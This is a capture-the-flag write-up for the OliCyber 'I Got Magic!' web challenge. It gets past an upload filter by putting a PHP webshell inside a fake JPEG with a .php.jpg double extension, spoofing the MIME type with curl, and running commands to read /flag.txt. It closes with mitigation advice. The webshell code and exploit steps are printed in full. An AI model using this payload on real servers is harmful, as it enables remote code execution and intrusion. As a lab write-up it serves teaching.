# I Got Magic!

**Competition:** OliCyber<br>
**Category:** Web / File Upload<br>
**URL:** http://got-magic.challs.olicyber.it

---

## Description

> This web page is so boring, I can only upload pictures of my favorite kittens. Can you do something more interesting?

The objective is to bypass the upload filter and upload a **PHP webshell** to execute remote commands (RCE). The flag is located in `/flag.txt`.

---

## Solution

### Step 1 — Filter Analysis

The site allows image uploads. The server validates the file type by checking the **MIME type** (`image/jpeg`), but does not analyze the file content or block **double extensions**.

This allows us to upload a file with `.php.jpg` extension that contains executable PHP code.

---

### Step 2 — Payload Creation

We create a file with a valid JPEG header followed by a PHP webshell:

```bash
# Generate a minimal valid JPEG (header + EOF marker)
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' \
  > /tmp/igotmagic.php.jpg

# Append the PHP webshell to the end of the JPEG
printf '<?php system($_GET["cmd"]); ?>' \
  >> /tmp/igotmagic.php.jpg

echo "Payload created"
```

---

### Step 3 — File Upload

```bash
curl -s -X POST http://got-magic.challs.olicyber.it/ \
  -F "image=@/tmp/igotmagic.php.jpg;type=image/jpeg" \
  -F "submit=Upload" \
  | grep -oP 'uploads/[^\s"<]+'
```

**Output:**
```
uploads/1773312376igotmagic.php.jpg
```

The server accepted the file because the MIME type was `image/jpeg`.

---

### Step 4 — Command Execution via Webshell

```bash
curl -s "http://got-magic.challs.olicyber.it/uploads/1773312376igotmagic.php.jpg?cmd=cat+/flag.txt"
```

**Output:**
```
flag{...}
```

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | Unrestricted File Upload + RCE |
| **Root Cause** | Validation only on MIME type, not extension |
| **Vector** | Double extension `.php.jpg` executed as PHP |
| **Impact** | Remote Code Execution on the server |

The server checked that the file was an image by verifying the MIME type declared by the client (`image/jpeg`), but the web server still executed the file as PHP thanks to the double extension `.php.jpg`.

---

## Conclusions

- Never trust the MIME type declared by the client — it's easily falsifiable
- Validate the file content, not just the MIME header
- Block double extensions (`.php.jpg`, `.php.png`, etc.)
- Save uploaded files **outside the web root** or in a non-executable directory
- Use a restrictive whitelist of allowed extensions and MIME types
- Rename uploaded files with UUIDs or random names to prevent predictability
- Configure the web server to not execute scripts in upload directories